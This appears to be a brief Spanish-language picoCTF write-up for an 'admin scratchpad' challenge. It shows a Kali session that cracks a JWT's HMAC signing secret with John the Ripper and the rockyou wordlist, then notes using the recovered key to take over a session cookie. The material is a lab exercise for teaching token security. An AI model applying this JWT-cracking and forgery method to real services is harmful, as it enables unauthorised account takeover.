### Descripción

### Solución
Check the admin scratchpad!http://fickle-tempest.picoctf.net:63346
### Solución 1 - kali
```
└─$ echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ2lzZWxsZSJ9.6sYqGiyHaWuH2jv0gLoVEyxSEo1fVs91VQSm14hv8AY" >> tooken

┌──(kali㉿kali)-[~]
└─$ john tooken --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:05 DONE (2026-03-02 14:18) 0.1788g/s 1323Kp/s 1323Kc/s 1323KC/s iloverob4live345..ilovemymother@
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

nos grabamos como ilovepico y copiamos la cookie
```
### Notas adicionales 

### Referencias